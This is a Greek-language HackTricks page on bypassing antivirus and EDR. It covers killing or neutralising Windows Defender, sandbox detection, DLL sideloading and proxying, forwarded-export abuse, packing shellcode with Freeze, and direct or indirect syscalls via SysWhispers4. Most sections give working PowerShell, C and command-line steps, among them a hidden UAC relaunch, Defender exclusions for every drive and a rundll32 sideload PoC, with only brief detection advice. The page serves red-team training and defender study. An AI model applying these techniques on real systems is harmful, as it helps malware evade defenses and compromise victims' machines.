# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από τον** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Εργαλείο για να σταματήσει τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Εργαλείο που σταματά τη λειτουργία του Windows Defender προσποιούμενο ότι είναι ένα άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Δόλωμα UAC τύπου installer πριν από την παραποίηση του Defender

Οι δημόσιοι loaders που μεταμφιέζονται σε cheats παιχνιδιών διανέμονται συχνά ως unsigned installers Node.js/Nexe, οι οποίοι πρώτα **ζητούν από τον χρήστη αυξημένα δικαιώματα** και έπειτα εξουδετερώνουν το Defender. Η διαδικασία είναι απλή:

1. Ελέγχουν αν υπάρχει περιβάλλον admin με την εντολή `net session`. Η εντολή πετυχαίνει μόνο όταν ο καλών έχει δικαιώματα admin, επομένως η αποτυχία υποδεικνύει ότι ο loader εκτελείται ως κανονικός χρήστης.
2. Κάνουν αμέσως επανεκκίνηση του ίδιου του loader με το ρήμα `RunAs`, ώστε να εμφανιστεί το αναμενόμενο μήνυμα συναίνεσης UAC διατηρώντας την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν «cracked» λογισμικό, οπότε συνήθως αποδέχονται την προτροπή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσει αυξημένα δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender αντί να απενεργοποιούν απευθείας την υπηρεσία. Αρχικά, ο loader τερματίζει τη διεργασία GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και έπειτα προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην μπορούν να σαρωθούν όλα τα προφίλ χρηστών, οι κατάλογοι συστήματος και οι αφαιρούμενοι δίσκοι:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks κ.λπ.), επομένως **κάθε μελλοντικό payload που θα αποθηκευτεί οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προνοητικός — οι επιτιθέμενοι διατηρούν τη δυνατότητα να φορτώσουν μη υπογεγραμμένους drivers αργότερα, χωρίς να χρειαστεί να πειράξουν ξανά το Defender.
- Όλες οι αλλαγές καταχωρίζονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας στα επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Εφόσον δεν διακόπτεται καμία υπηρεσία του Defender, οι απλοϊκοί έλεγχοι κατάστασης εξακολουθούν να αναφέρουν «το antivirus είναι ενεργό», παρόλο που η επιθεώρηση σε πραγματικό χρόνο δεν ελέγχει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **Μεθοδολογία AV Evasion**

Σήμερα, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγχουν αν ένα αρχείο είναι κακόβουλο ή όχι: στατική ανίχνευση, δυναμική ανάλυση και, για τα πιο προηγμένα EDR, ανάλυση συμπεριφοράς.

### **Στατική ανίχνευση**

Η στατική ανίχνευση επιτυγχάνεται με τον εντοπισμό γνωστών κακόβουλων συμβολοσειρών ή ακολουθιών byte σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, ψηφιακές υπογραφές, εικονίδιο, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να παρακαμφθεί αυτό το είδος ανίχνευσης:

- **Κρυπτογράφηση**

Αν κρυπτογραφήσετε το binary, το AV δεν θα έχει τρόπο να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να το αποκρυπτογραφήσει και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξετε ορισμένες συμβολοσειρές στο binary ή στο script σας για να ξεπεράσει τον έλεγχο του AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Προσαρμοσμένα εργαλεία**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακόβουλες υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος να ελέγξετε τη στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλαπλά τμήματα και ζητά από το Defender να σαρώσει το καθένα ξεχωριστά. Έτσι, μπορεί να σας πει ακριβώς ποιες συμβολοσειρές ή ποια byte στο binary σας έχουν επισημανθεί.

Συνιστώ ανεπιφύλακτα να δείτε αυτήν τη [playlist στο YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με πρακτικές τεχνικές AV Evasion.

### Offline δοκιμές χαρακτηριστικών PE για στατικούς ταξινομητές

Τα bytes ενός packed ή κρυπτογραφημένου payload είναι μόνο μία από τις εισόδους ενός στατικού ταξινομητή. Το EMBER2024 εξάγει χαρακτηριστικά PE, όπως imports, exports, sections, headers και δεδομένα Authenticode.<sup>[[48]](#references)</sup> Σε ένα πείραμα με loader, η προσθήκη 141 imports που έμοιαζαν αβλαβή μείωσε κατά 93% τη βαθμολογία κακόβουλης δραστηριότητας του EMBER2024, ενώ imports που σχετίζονται με malware την αύξησαν. Αυτό είναι αποτέλεσμα για το συγκεκριμένο μοντέλο και τα συγκεκριμένα δείγματα, όχι αξιόπιστη παράκαμψη συγκεκριμένου προϊόντος AV/EDR.<sup>[[50]](#references)</sup>

Για μια εξουσιοδοτημένη δοκιμή loader, κρατήστε σταθερά το payload και τη διαδρομή εκτέλεσης, αλλάξτε μία προβλεπόμενη μεταβλητή build ανά παραλλαγή και συγκρίνετε τις βαθμολογίες offline. Εξετάστε τα χαρακτηριστικά του PE που προκύπτει, επειδή μια αλλαγή στο build μπορεί να επηρεάσει περισσότερες από μία ομάδες χαρακτηριστικών.<sup>[[49]](#references)[[50]](#references)</sup> Για να παραμείνουν τα προβλεπόμενα imports στο IAT, καλέστε τα επιλεγμένα Win32 APIs από κώδικα που είναι προσβάσιμος. Αλλάζετε την επιλογή και κατανέμετε τα σημεία κλήσης σε διαφορετικά builds, αντί να δημιουργείτε μια σταθερή συνάρτηση καμουφλάζ που μπορεί να μετατραπεί σε υπογραφή. Το πείραμα ανέφερε επίσης χαμηλότερες βαθμολογίες με έγκυρη υπογραφή κώδικα, εγγραφές export και περισσότερες συναρτήσεις που αυξάνουν το μέγεθος του `.pdata`· η μη έγκυρη υπογραφή είχε μικρή επίδραση, όπως και η επίδραση του `.pdata`.<sup>[[50]](#references)</sup>

Το package `thrember` παρέχει εξαγωγή χαρακτηριστικών και μοντέλα αναφοράς. Αφού το εγκαταστήσετε, χρησιμοποιήστε το `thrember.download_models("models")` με έναν υπάρχοντα κατάλογο `models` και, στη συνέχεια, εκτελέστε το εργαλείο βαθμολόγησης από τον γονικό κατάλογο: η βοηθητική συνάρτηση λήψης αλλάζει τον τρέχοντα κατάλογο εργασίας. Ο ταξινομητής PE μπορεί να βαθμολογήσει έναν κατάλογο με builds χωρίς να τα υποβάλει σε υπηρεσία σάρωσης:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Κρατήστε σταθερές τις εκδόσεις του model και του feature extractor κατά τη σύγκριση. Μια χαμηλότερη offline βαθμολογία δείχνει μόνο πώς αντιδρά αυτός ο classifier στο τροποποιημένο binary· δεν αποδεικνύει αποφυγή του behavioral analysis, της emulation ή του διαφορετικού model ενός vendor.<sup>[[49]](#references)[[50]](#references)</sup> Για [polymorphism ανά build και camouflage του εξωτερικού binary σε virtualized payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), δείτε το ξεχωριστό execution model.

### **Dynamic analysis**

Dynamic analysis είναι όταν το AV εκτελεί το binary σας σε sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των κωδικών πρόσβασης του browser σας, εκτέλεση minidump του LSASS κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο, αλλά μπορείτε να κάνετε τα εξής για να αποφύγετε τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με την υλοποίηση, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης του dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία χωρίς να διακόψουν τη ροή εργασίας του χρήστη, οπότε οι μεγάλες αναμονές μπορεί να εμποδίσουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλώς να παρακάμψουν την αναμονή, ανάλογα με την υλοποίησή της.
- **Έλεγχος των πόρων του μηχανήματος** Συνήθως τα sandboxes έχουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε δημιουργικοί, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων· δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Έλεγχοι ειδικοί για το μηχάνημα** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή και να δείτε αν ταιριάζει με αυτό που ορίσατε. Αν δεν ταιριάζει, μπορείτε να τερματίσετε το πρόγραμμά σας.

Αποδεικνύεται ότι το computername του sandbox της Microsoft Defender είναι HAL9TH, οπότε μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την εκτέλεση. Αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox της Defender, οπότε μπορείτε να τερματίσετε το πρόγραμμά σας.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως είπαμε και νωρίτερα σε αυτή την ανάρτηση, τα **public tools** αργά ή γρήγορα **εντοπίζονται**, οπότε θα πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται όντως να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε κάποιο άλλο, λιγότερο γνωστό project που κάνει επίσης dump το LSASS;

Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Για παράδειγμα, το mimikatz είναι πιθανότατα ένα από τα malware με τις περισσότερες επισημάνσεις από AV και EDR, αν όχι το πρώτο. Παρότι το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AV, οπότε απλώς αναζητήστε εναλλακτικές για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων** στη Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν στόχος σας είναι η μακροπρόθεσμη αποφυγή εντοπισμού. Αν θέλετε να ελέγξετε αν ένα συγκεκριμένο AV εντοπίζει το payload σας, εγκαταστήστε το σε VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, **προτιμάτε πάντα τη χρήση DLLs για evasion**. Από την εμπειρία μου, τα DLL files συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε είναι ένα πολύ απλό τέχνασμα για να αποφύγετε τον εντοπισμό σε ορισμένες περιπτώσεις (αν, φυσικά, το payload σας μπορεί να εκτελεστεί ως DLL).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό εντοπισμού 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό εντοπισμού 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά τεχνάσματα που μπορείτε να χρησιμοποιήσετε με DLL files για να είστε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-θύμα και τα κακόβουλα payload(s) δίπλα-δίπλα.

Μπορείτε να εντοπίσετε προγράμματα ευάλωτα σε DLL Sideloading με το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων μέσα στο "C:\Program Files\\" που είναι ευάλωτα σε DLL hijacking, καθώς και τα αρχεία DLL που επιχειρούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που επιτρέπουν DLL Hijacking/Sideloading**. Αν γίνει σωστά, αυτή η τεχνική είναι αρκετά stealthy, αλλά αν χρησιμοποιήσετε προγράμματα που είναι δημόσια γνωστό ότι επιτρέπουν DLL Sideloading, μπορεί να εντοπιστείτε εύκολα.

Αν απλώς τοποθετήσετε ένα κακόβουλο DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτωθεί το payload σας, καθώς το πρόγραμμα περιμένει συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να λύσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντάς μας να χειριστούμε την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) του [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό DLL μετονομασμένο.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα έλεγα ότι αυτό είναι επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και [το βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα και σε βάθος για όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Οι μονάδες Windows PE μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι «forwarders»: αντί να δείχνει σε κώδικα, η καταχώριση εξαγωγής περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την εξαγωγή, ο Windows loader:

- Φορτώνει το `TargetDll`, αν δεν έχει ήδη φορτωθεί
- Επιλύει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο χώρο ονομάτων KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο της μονάδας που εκτελεί την προώθηση.

Αυτό παρέχει μια έμμεση primitive sideloading: βρείτε ένα signed DLL που εξάγει μια συνάρτηση η οποία προωθείται σε όνομα μονάδας που δεν είναι KnownDLL και τοποθετήστε το δίπλα σε ένα DLL που ελέγχει ο attacker και έχει ακριβώς το όνομα της μονάδας-στόχου της προώθησης. Όταν γίνει κλήση στο forwarded export, ο loader επιλύει την προώθηση και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (αντιγραφή-επικόλληση):
1) Αντιγράψτε το υπογεγραμμένο DLL συστήματος σε έναν φάκελο με δυνατότητα εγγραφής
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Αρκεί ένα ελάχιστο DllMain για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη function που γίνεται forward για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Παρατηρηθείσα συμπεριφορά:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα εμφανιστεί σφάλμα "missing API" μόνο αφού εκτελεστεί το `DllMain`

Συμβουλές αναζήτησης:
- Εστιάστε σε forwarded exports όπου το module-στόχος δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το inventory των forwarder των Windows 11 για να αναζητήσετε υποψήφιες επιλογές: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για detection/defense:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από διαδρομές εκτός συστήματος και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο βασικό όνομα από αυτόν τον κατάλογο
- Δημιουργήστε alerts για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → `keyiso.dll` εκτός συστήματος → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από τον χρήστη
- Επιβάλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε την εγγραφή και εκτέλεση στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα toolkit payload για την παράκαμψη EDRs μέσω suspended processes, direct syscalls και εναλλακτικών μεθόδων εκτέλεσης`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealth τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού: ό,τι λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο, επομένως μην βασίζεστε ποτέ σε ένα μόνο εργαλείο. Αν είναι δυνατόν, δοκιμάστε να συνδυάσετε πολλές τεχνικές evasion.

## Direct/Indirect Syscalls & Επίλυση SSN (SysWhispers4)

Τα EDR συχνά τοποθετούν **inline hooks σε user-mode** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: εκπέμπει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (χωρίς πρόσβαση σε export του `ntdll`).
- **Indirect**: μεταπηδά σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για evasion ευρετικών μεθόδων). Το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε κλήση.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο· εντοπίζει μια ακολουθία syscall κατά τον χρόνο εκτέλεσης.

**Στρατηγικές επίλυσης SSN ανθεκτικές σε hooks:**
- **FreshyCalls (VA sort)**: συνάγει τα SSN ταξινομώντας τα syscall stubs κατά εικονική διεύθυνση, αντί να διαβάζει τα bytes των stubs.
- **SyscallsFromDisk**: αντιστοιχίζει ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSN από το `.text` του και στη συνέχεια καταργεί την αντιστοίχιση (παρακάμπτει όλα τα hooks στη μνήμη).
- **RecycledGate**: συνδυάζει τη συναγωγή SSN με ταξινόμηση VA και την επικύρωση opcode όταν ένα stub είναι καθαρό· αν έχει hook, χρησιμοποιεί εναλλακτικά τη συναγωγή VA.
- **HW Breakpoint**: ορίζει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά τον χρόνο εκτέλεσης, χωρίς να αναλύσει hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Κατά την ανάλυση των syscall exports από καθαρό x64 `ntdll` για SSN, υποστηρίξτε τόσο την ακολουθία `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) όσο και την ίδια ακολουθία με πρόθεμα `F3 0F 1E FA` (`endbr64`). Η δεύτερη είναι ένα stub με πρόθεμα CET: ένας parser που υποθέτει ότι το SSN βρίσκεται πάντα σε μία σταθερή μετατόπιση θα το χάσει. Αν αποτύχει η αρχικοποίηση του indirect-syscall και ο loader καταφύγει στο `GetProcAddress`, οι κλήσεις μέσω αυτών των exports ενδέχεται και πάλι να συναντήσουν hooks σε user mode.<sup>[[54]](#references)</sup>

### Εναλλακτικά syscall exports στο `tprtdll.dll`

Το project αναφέρει το `tprtdll.dll` ως DLL υπογεγραμμένο από τη Microsoft, το οποίο υπάρχει στο `C:\Windows\System32\` στα Windows 11 build 26100 και νεότερα. Έχει διαφορετικές διευθύνσεις κώδικα από το `ntdll.dll`, επομένως ένα hook που κάνει patch μόνο σε ένα syscall entrypoint του `ntdll` δεν κάνει patch στο αντίστοιχο stub του `tprtdll`. Σε αντίθεση με τις παραπάνω μεθόδους επίλυσης SSN, αυτή η προσέγγιση φορτώνει το `tprtdll.dll` και καλεί απευθείας ένα διαθέσιμο export `Nt*` ή `Zw*` μέσω του `GetProcAddress`. Ελέγξτε ότι υπάρχουν το DLL και τα απαιτούμενα exports και χρησιμοποιήστε τα κατάλληλα πρωτότυπα συναρτήσεων NT.<sup>[[55]](#references)</sup>

Το self-injection PoC χρησιμοποιεί το `tprtdll!NtAllocateVirtualMemoryEx` για να εκχωρήσει μνήμη RW, αντιγράφει bytes με `memcpy`, αλλάζει την περιοχή σε RX με το `tprtdll!ZwProtectVirtualMemory` και ξεκινά ένα thread με το `tprtdll!RtlCreateUserThread`.<sup>[[56]](#references)</sup> Η παραλλαγή cross-process χρειάζεται προσβάσιμο handle διεργασίας-στόχου και χρησιμοποιεί το `WriteProcessMemory` για την αντιγραφή.<sup>[[57]](#references)</sup> Το inventory των exports του project δεν περιλαμβάνει τα `NtOpenProcess`, `NtWriteVirtualMemory` και `NtCreateThreadEx`, επομένως δεν είναι δυνατό να χρησιμοποιηθεί εναλλακτικό export για κάθε λειτουργία injection.<sup>[[55]](#references)</sup>

Το PoC δεν αποδεικνύει ότι το `RtlCreateUserThread` είναι direct syscall stub ή ότι οι εσωτερικές κλήσεις του αποφεύγουν τα hooks του `ntdll` απλώς και μόνο επειδή το export επιλύθηκε από το `tprtdll`.<sup>[[56]](#references)</sup> Το παράδειγμα cross-process ενσωματώνει επίσης τις διευθύνσεις των `WinExec` και `ExitThread`, οι οποίες επιλύθηκαν στο injector· αυτές οι διευθύνσεις πρέπει να είναι έγκυρες στη διεργασία-στόχο για να λειτουργήσει το payload του παραδείγματος.<sup>[[57]](#references)</sup>

Αυτό παρακάμπτει μόνο hooks που περιορίζονται στα αντίστοιχα exports του `ntdll`· δεν αποκρύπτει τα syscalls από την παρακολούθηση σε επίπεδο kernel.<sup>[[55]](#references)</sup> Για μια διαδρομή injection που αντίθετα αποφεύγει τις απομακρυσμένες εγγραφές και τα νέα threads, δείτε την ενότητα [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέψει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσατε με κάποιον τρόπο να εκτελέσετε payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

